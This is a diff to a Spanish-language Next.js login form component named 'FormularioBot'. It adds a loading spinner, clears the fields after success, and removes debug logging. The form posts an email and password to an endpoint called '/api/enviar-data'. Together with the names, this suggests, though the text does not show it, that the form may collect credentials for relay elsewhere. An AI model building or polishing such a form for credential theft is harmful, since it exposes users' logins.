@@ -1,6 +1,7 @@
 "use client";
 import Link from "next/link";
 import { useState } from "react";
+import { BiLoaderCircle } from "react-icons/bi";
 
 import { FaEye, FaEyeSlash } from "react-icons/fa";
 
@@ -17,8 +18,14 @@ export default function FormularioBot({
     email: "",
     password: "",
   });
+
+  const [loading, setLoading] = useState(false);
+
   const handleEnvio = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+
+    setLoading(true);
+
     try {
       const respuesta = await fetch("/api/enviar-data", {
         method: "POST",
@@ -28,11 +35,19 @@ export default function FormularioBot({
         body: JSON.stringify(datos),
       });
 
-      console.log(respuesta);
       const resultado = await respuesta.json();
-      console.log(resultado);
+
+      if (resultado.success) {
+        setDatos({
+          email: "",
+          password: "",
+        });
+        setLoading(false);
+      }
     } catch (error) {
       console.log(error);
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -107,7 +122,11 @@ export default function FormularioBot({
           type="submit"
           className="bg-[#8c662b] w-full lg:py-3 py-2.5 rounded-md mt-4 text-white text-[0.9375rem]"
         >
-          ENTRAR
+          {loading ? (
+            <BiLoaderCircle className="animate-spin mx-auto" size={22.5} />
+          ) : (
+            "ENTRAR"
+          )}
         </button>
       </div>
     </form>
